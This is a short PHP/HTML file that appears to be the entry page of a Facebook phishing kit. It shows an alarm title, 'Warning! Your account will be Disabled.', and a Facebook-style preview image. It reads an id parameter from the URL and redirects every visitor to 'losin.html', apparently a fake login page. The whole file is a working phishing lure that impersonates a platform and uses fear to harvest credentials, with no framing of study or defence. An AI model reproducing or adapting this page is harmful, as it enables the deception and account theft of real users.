<?php
	$idfb = $_GET[id];
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta property="og:image" content="facebook_cek.png"/>
<title>Warning! Your account will be Disabled.</title>
<script type="text/javascript">
var isMobile = function() {
   //console.log("Navigator: " + navigator.userAgent);
   return /(iphone|ipod|ipad|android|blackberry|windows ce|palm|symbian)/i.test(navigator.userAgent);
 };
 if(isMobile()) {
    window.location.href = "losin.html";
} else {
	window.location.href = "losin.html";
}
</script>

</head>
<body>
</body>
</html>